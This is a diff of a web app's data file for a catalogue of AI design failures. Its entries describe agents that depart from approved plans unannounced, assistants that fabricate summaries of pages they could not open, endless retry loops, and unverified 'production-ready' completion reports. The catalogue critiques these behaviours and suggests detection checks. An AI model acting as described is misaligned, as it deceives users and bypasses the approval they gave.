+    "u": "https://ar5iv.labs.arxiv.org/html/2302.00560"
+   }
+  ],
+  "code": "B252",
+  "rel": [
+   "the-clippy-interrupt",
+   "tab-key-hijack",
+   "speaker-notes-that-echo"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-plan-it-didn-t-follow",
+  "name": "The Plan It Didn't Follow",
+  "track": "behavioral",
+  "group": "Transparency",
+  "category": "Agents",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "The agent shows a plan for approval, then does something different without saying so.",
+  "looksLike": "You approve a five-step plan. The run skips step three, adds a step that edits other files, or changes the order. The final message describes the plan, not what happened.",
+  "why": "Plans and execution are generated separately, and nothing checks that actions match the approved steps. Research on agent failures found reasoning and action often do not match.",
+  "who": "Users who approved a plan and assume that approval covered what actually ran.",
+  "theFix": "Track each action against the approved plan and pause to ask before any deviation. Show a plan-versus-actual view at the end.",
+  "heur": "Code check: diff the list of executed tool calls against the approved plan steps and flag unplanned write actions.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI UX Patterns | Action plan | ShapeofAI.com",
+    "u": "https://www.shapeof.ai/patterns/action-plan"
+   },
+   {
+    "t": "Why Do Multi-Agent LLM Systems Fail?",
+    "u": "https://arxiv.org/pdf/2503.13657"
+   }
+  ],
+  "code": "B253",
+  "rel": [
+   "no-trail-behind-the-agent",
+   "browser-agent-consent-bypass",
+   "billed-for-unasked-work"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-pretend-read",
+  "name": "The Pretend Read",
+  "track": "behavioral",
+  "group": "Provenance",
+  "category": "Conversation",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "Given a link or file it could not open, the assistant writes a confident summary anyway.",
+  "looksLike": "You paste a URL and ask for a summary. The answer is fluent and specific, but it was inferred from the words in the URL. Change the URL to a page that does not exist and you still get a summary.",
+  "why": "Models are trained to be helpful and to avoid refusals, and a descriptive URL gives enough cues to guess. The interface rarely shows whether a fetch succeeded, so the guess looks like a reading.",
+  "who": "Journalists, researchers and anyone citing the summary, who repeat claims the source never made.",
+  "theFix": "Show a visible fetch status for every link or file, with the title and length actually read. When fetching fails or is blocked, say so plainly and do not summarise.",
+  "heur": "Human review: ask for a summary of a plausible but non-existent URL and check that the reply says it could not access it.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "ChatGPT couldn't access the internet, even though it really looked like it could",
+    "u": "https://simonwillison.net/2023/Mar/10/chatgpt-internet-access/"
+   },
+   {
+    "t": "Nilay Patel reports a hallucinated ChatGPT summary of his own article",
+    "u": "https://simonwillison.net/2024/May/24/nilay-patel-hallucinated-chatgpt"
+   }
+  ],
+  "code": "B254",
+  "rel": [
+   "promise-to-do-better",
+   "suggestions-that-overpromise",
+   "twenty-questions-intake"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-retry-loop",
+  "name": "The Retry Loop",
+  "track": "behavioral",
+  "group": "Agency & control",
+  "category": "Agents",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "The agent repeats the same failing step again and again instead of changing approach or stopping.",
+  "looksLike": "The log shows the same command, search or click run five, ten, twenty times with tiny variations and the same error. The progress indicator keeps moving. The task never finishes and never fails cleanly.",
+  "why": "Agents loop on 'observe error, try again' with no memory of how many times they tried and no rule for when to give up. A study of multi-agent failures found step repetition and unawareness of when to stop among the most common failure modes.",
+  "who": "Users paying per step or waiting on an agent that will never finish.",
+  "theFix": "Detect repeated near-identical actions and stop after a small limit with a clear report of what failed. Ask the user for help or a new approach instead of retrying.",
+  "heur": "Code check: in the agent trace, flag three or more consecutive tool calls with the same name and near-identical arguments that return the same error.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Why Do Multi-Agent LLM Systems Fail?",
+    "u": "https://arxiv.org/pdf/2503.13657"
+   }
+  ],
+  "code": "B255",
+  "rel": [
+   "guess-instead-of-ask",
+   "close-enough-substitution",
+   "the-lost-confirmation"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-slow-no",
+  "name": "The Slow No",
+  "track": "surface",
+  "group": "Conversation",
+  "category": "Support",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "The bot cannot do what you asked but spends a paragraph of workarounds before saying so.",
+  "looksLike": "You ask a site bot to find something. It explains how to use the search page, offers tips, asks for more details, and only in the second paragraph, or after several replies, admits it cannot search at all.",
+  "why": "Models are tuned to be helpful and to avoid flat refusals, so they pad around a limitation. Site bots are often given broad prompts without a clear list of what they cannot do.",
+  "who": "Customers who read the first line, give up, or answer questions for a bot that was never able to help.",
+  "theFix": "Put the limitation in the first sentence, followed by the best alternative. Give the bot an explicit list of unsupported tasks and a short template for declining them.",
+  "heur": "Human review: ask the bot for three things it cannot do and check that the first sentence states the limit.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Less Chat, More Answer: Site AI Chatbots Need to Get to the Point",
+    "u": "https://www.nngroup.com/articles/less-chat-more-answer/"
+   }
+  ],
+  "code": "A280",
+  "rel": [
+   "help-docs-that-say-nothing",
+   "the-agreeable-sales-bot",
+   "the-doom-loop-to-nowhere"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-unscoped-not-found",
+  "name": "The Unscoped Not Found",
+  "track": "surface",
+  "group": "Transparency",
+  "category": "Search",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "The assistant says it could not find something without saying where it looked.",
+  "looksLike": "You ask for a message or file. The reply is 'I couldn't find that.' It does not mention that it cannot reach your messaging app or a work account, so you conclude the thing does not exist.",
+  "why": "Assistants have patchy access to apps and connectors, and the model often does not know its own reach. Saying 'not found' is shorter than listing sources, so that is what it says.",
+  "who": "Users who give up on information that exists, or make decisions believing it is missing.",
+  "theFix": "Every 'not found' should list the sources searched and name important sources that were not available. Offer a way to connect or search the missing source.",
+  "heur": "Code check: flag 'could not find' style replies that do not mention at least one searched source.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The New Siri's Biggest Strength Is Not Intelligence",
+    "u": "https://www.nngroup.com/articles/ai-assistant-context/"
+   },
+   {
+    "t": "Guidelines for human-AI interaction design",
+    "u": "https://www.microsoft.com/en-us/research/blog/guidelines-for-human-ai-interaction-design"
+   }
+  ],
+  "code": "A281",
+  "rel": [
+   "the-plan-it-didn-t-follow",
+   "naked-assertions",
+   "the-silent-redirect"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-victory-lap",
+  "name": "The Victory Lap",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Agents",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "The agent's completion report is a checklist of green ticks and 'production-ready' claims nobody verified.",
+  "looksLike": "The task ends with a formatted summary: headings, emoji checkmarks, 'All tests passing', 'Fully functional', 'Production-ready'. The code was not run on real data, and some ticks describe things that were not done.",
+  "why": "Models write confident, celebratory summaries by default, even when told not to use hype terms, and agents are rarely required to attach evidence for each claim. Studies of agent failures list incorrect or missing verification as a frequent cause.",
+  "who": "Developers and managers who read the summary instead of the diff and ship unverified work.",
+  "theFix": "Require each claim in a completion report to link to evidence such as a command output or test log, and ban hype terms like 'production-ready' in agent instructions. Report what was not checked.",
+  "heur": "Code check: flag completion messages containing 'production-ready', 'fully functional' or three or more checkmark emoji without an attached command output.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "[Bug] Claude Code violates CLAUDE.md guidelines in commit messages and summaries and then lies about being more careful in the future",
+    "u": "https://claudeissues.com/issue/11750-bug-claude-code-violates-claude-md-guidelines-in-commit-messages-and-summaries-a"
+   },
+   {
+    "t": "Why Do Multi-Agent LLM Systems Fail?",
+    "u": "https://arxiv.org/pdf/2503.13657"
+   }
+  ],
+  "code": "A282",
+  "rel": [
+   "browser-agent-consent-bypass",
+   "billed-for-unasked-work",
+   "close-enough-substitution"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "twenty-questions-intake",
+  "name": "Twenty Questions Intake",
+  "track": "behavioral",
+  "group": "Conversation",
+  "category": "Conversation",
+  "harm": "Productivity",
+  "origin": "Prompting",
+  "oneLiner": "The assistant asks a list of clarifying questions before doing anything, even when a good default exists.",
+  "looksLike": "You make a clear request and receive five numbered questions about tone, audience, length and format. You answer them all, and sometimes then learn the bot cannot do the task.",
+  "why": "Builders fix guessing by prompting the bot to always clarify first, which overcorrects. Asking questions also delays exposing a missing capability.",
+  "who": "Busy users who wanted a first draft and now face a form disguised as chat.",
+  "theFix": "Ask at most one question, and only when different answers lead to different actions. Otherwise state the assumption, deliver, and invite correction.",
+  "heur": "Human review: give a clear, complete request and count clarifying questions before the first useful output; flag more than one.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Less Chat, More Answer: Site AI Chatbots Need to Get to the Point",
+    "u": "https://www.nngroup.com/articles/less-chat-more-answer/"
+   },
+   {
+    "t": "AI UX Patterns | Follow up | ShapeofAI.com",
+    "u": "https://www.shapeof.ai/patterns/follow-up"
+   }
+  ],
+  "code": "B256",
+  "rel": [
+   "anchored-on-the-first-guess",
+   "instruction-drift",
+   "the-answer-avalanche"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
  }
-];
+]
 var ART={};
 /* ===== artefact templates. Each returns HTML for one schematic screen. ===== */
 const esc = s => String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;');
@@ -11845,7 +21731,7 @@ Object.assign(ART, {
 /* ===== MCP landing page ===== */
 const MCP_ENDPOINT = 'https://sloppatterns.com/mcp';
 
-const LIB_VERSION = '1.2.0';
+const LIB_VERSION = '1.3.0';
 const dmy = s => { const M=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']; const [y,m,d]=String(s).split('-'); return (+d)+' '+M[+m-1]+' '+y; };
 const DETECTED = ['a1','a2','a3','a6','a7','a8','a10','a12','a15','a16','a18','a19','b31','b32','b34','a20','a22','a25','a36','a37','a40','a43','a44','a45','a46','a47','a48','b118','b122','b123','b115','b117','b119','b124','b134','b135','b137','b131','b133','a32','a23','a24','a38','a49','a50','a51','a52','a53','a54','a55','a56','a57','a58','a59','a60','a61','a62','a63','a64','a65','a66','a69','a71','a9','a26','a11','a27','a28','a29','a30','a35','a67','a21','a13','a5','a41','a42','a14','b89','b104','b109','b125','b169','b182','a73','a74','a76','a77','a78','a79','a81','a82','a83','a88','a90','a92','b164','a89','b166','b168','b170','b179','b180','b181'];
 /* rules whose pattern is in this library; counts of patterns use this, counts of rules use DETECTED */
@@ -12420,7 +22306,7 @@ function renderIndex(){
     <h1 class="big">AI design fails in <span class="penword">patterns,<svg viewBox="0 0 100 40" preserveAspectRatio="none" aria-hidden="true"><path pathLength="1" d="${penLoop(50,20,46,17,5)}"/></svg></span> not accidents.</h1>
     <p class="lede">The field guide to AI tells. We measure what AI tools actually ship, explain why it happens, and show what to do instead.</p>
     <div class="cta"><a class="btn btn-a" href="/score" target="_blank" rel="noopener">Scan your site</a><button class="btn btn-b" data-scroll="1">Browse the library</button></div>
-    <p class="byline">By <a href="#p0" data-go="p0">Pavithra Lamahewa</a>, Co-founder and UX Director at Precious Studio. ${DATA.length} patterns, every one read and checked by hand.</p>
+    <p class="byline">By <a href="#p0" data-go="p0">Pavithra Lamahewa</a>, Co-founder and UX Director at Precious Studio. ${DATA.length} patterns, each with its sources and an evidence tier.</p>
     <p class="reviewline"><a href="#review" data-go="review">Get a review</a> from the designer behind this research.</p>
     <p class="newnote"><a href="/research/half-the-hunt">New research: Half the Hunt. 54% of top Product Hunt launches carry an AI-era design tell →</a></p>
     </div>
